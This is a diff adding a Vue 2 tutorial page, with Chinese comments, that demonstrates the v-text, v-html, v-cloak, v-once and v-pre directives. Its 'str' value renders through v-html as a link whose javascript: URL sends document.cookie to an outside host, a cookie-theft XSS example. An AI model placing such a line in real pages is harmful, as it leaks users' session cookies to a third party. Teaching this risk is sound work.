@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
+    <style>
+        [v-cloak] {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+     <!--
+        Vue中的事件修饰符：
+                1.prevent：阻止默认事件（常用）
+                2.stop：阻止事件冒泡（常用）
+                3.once：事件只触发一次（常用）
+                4.capture：使用事件的捕获模式
+                5.self：只有event.target是当前操作的元素时才触发事件
+                6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕
+    -->
+    <div id="app">
+        <div v-text="hello"></div>
+        <div v-html="str"></div>
+        <div v-html="str2"></div>
+        <h5>v-cloak:当网速过慢时 不显示 {{ }}
+            当 vue加载后在显示 vue会把  v-cloak 自动移除</h5>
+        <div v-cloak>{{ hello }}</div>
+        <h5>v-once 初次动态渲染后 就是为静态内容了</h5>
+        <div v-once>初始化值是： {{ n }}</div>
+        <div>当前值是： {{ n }}</div>
+        <button @click="n++">n++</button>
+        <h3 v-pre>v-pre 跳过所在节点的编译过程 如果该节点没有使用vue语法 可以加快编译</h3>
+        <h3 v-pre> {{ hello}}  v-pre vue不会解析该节点</h3>
+    </div>
+
+    <script>
+        let vm = new Vue({
+            el: '#app',
+            data: {
+                hello: 'hi hello', 
+                str: '<a href=javascript:location.href="https://www.xiaotao.cloud?"+document.cookie>点击我</a>',
+                n: 1
+            },
+        })
+    </script>
+</body>
+</html>
